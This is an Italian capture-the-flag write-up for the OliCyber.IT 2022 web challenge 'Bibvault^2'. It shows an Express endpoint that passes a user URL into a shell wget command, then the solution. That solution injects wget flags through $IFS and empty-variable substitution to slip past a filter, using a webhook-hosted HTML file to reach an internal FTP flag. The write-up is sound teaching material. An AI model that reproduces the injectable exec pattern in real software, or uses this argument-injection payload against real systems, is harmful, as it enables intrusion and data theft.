# OliCyber.IT 2022 - Competizione nazionale

## [web-4] Bibvault^2 (5 risoluzioni)

Il sito permette di scaricare e visualizzare il contenuto di un link tramite wget, la funzione che implementa il download è questa:

```js
const URL_WHITELIST =
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-:";
const QUERY_WHITELIST = "?$";

app.post("/files", authenticateToken, async (req, res) => {
  if (req.user === null) {
    res.redirect(303, "/login");
    return;
  }
  const url = decodeURI(req.body.url);
  const fail_check = [
    typeof url !== "string",
    Array.from(url).some((x) => !(URL_WHITELIST + QUERY_WHITELIST).includes(x)),
    // controllo che la querystring non superi i 25 caratteri, non vogliamo cose strane
    url.length -
      Math.min(
        ...Array.from(QUERY_WHITELIST).map((x) =>
          url.indexOf(x) != -1 ? url.indexOf(x) : 1000
        )
      ) >
      25,
    !(url.startsWith("https") || url.startsWith("http")),
    url.toLowerCase().includes("ftp"),
    url.toLowerCase().includes(".."),
    req.user.username.toLowerCase() == "gabibbo",
  ].find((e) => e);
  if (fail_check) {
    res.status(400);
    return;
  }
  exec(`wget ${url} --max-redirect 0`, {
    cwd: `/users/${await SHA256(req.user.username)}`,
  });
  res.redirect(303, "/files");
});
```

### Soluzione

Guardando la lista dei parametri passabili a wget con `wget --help`, ci si può accorgere di queste due opzioni

```
--recursive, -r               Scaricamento ricorsivo
--follow-ftp                  Segue i collegamenti FTP dai documenti HTML
```

A quel punto basta forgiare un file html che abbia un link al server ftp con la flag

```html
<html>
  <body>
    <a href="ftp://secretftp:21/flag"></a>
  </body>
</html>
```

All'interno dell'URL sono permessi i caratteri `$` e `-`, inoltre la `wget` è chiamata da una `execute`, possiamo quindi sfruttare la _parameter substitution_ offerta da sh ed utilizzare **IFS** (_Internal Field Separator_) per avere la flag. L'url finale (che dovrà rispondere con dell'HTML contenente un link alla flag) sarà:

`https://webhook/$IFS--follow-f$Dtp$IFS-r`

La flag sarà accessibile tramite l'url `http://bibvault/download?fileName=secretftp/flag`
